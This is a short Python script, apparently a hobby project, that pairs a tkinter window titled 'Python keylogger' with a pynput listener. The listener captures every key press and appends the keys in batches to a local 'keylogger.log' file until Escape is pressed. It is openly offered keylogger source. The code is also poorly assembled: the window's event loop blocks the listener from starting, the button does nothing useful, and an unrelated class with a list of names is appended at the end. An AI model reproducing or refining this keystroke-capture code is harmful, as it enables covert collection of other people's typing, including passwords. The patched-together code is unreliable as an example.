from pynput import keyboard
from tkinter import *
import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showinfo


class App(tk.Tk):
  def __init__(self):
    super().__init__()

    # configure the root window
    self.title('Python keylogger')
    self.iconbitmap(r"IMG.ico")
    self.geometry('400x110')

    # label
    self.label = ttk.Label(self, text='Activate key logger To disable it escape key on your keyboard')
    self.label.pack()

    # button
    self.button = ttk.Button(self, text='Click Me')
    self.button['command'] = self.button_clicked
    self.button.pack()

  def button_clicked(self):
    showinfo(title='Information', message='It is now active!')

if __name__ == "__main__":
  app = App()
  app.mainloop()

#Variable count and variable keys
count, keys = 0, []
#Function to save to a TXT file
def log_2_file(keys):
    with open("keylogger.log", "a") as log_file:
        for key in keys:
            log_file.write(str(key) + "\n")
            log_file.flush()
        log_file.write("\n")
#Function to add key presses to file
def key_pressed(key):
    global keys, count

    keys.append(str(key))
    count += 1

    if count == 10:
        log_2_file(keys)
        count, keys = 0, []
#Function Released to end the Program 
def key_released(key):
    if key == keyboard.Key.esc:
        return False
# loop
with keyboard.Listener(on_press=key_pressed, on_release=key_released) as loop:
    loop.join()

class Letters: 
    def __init__(self, name, roll): 
        self.name = name 
        self.roll = roll
   
# creating list       
list = [] 
  
# appending instances to list 
list.append( Letters('Akash', 2) )
list.append( Letters('Deependra', 40) )
list.append( Letters('Reaper', 44) )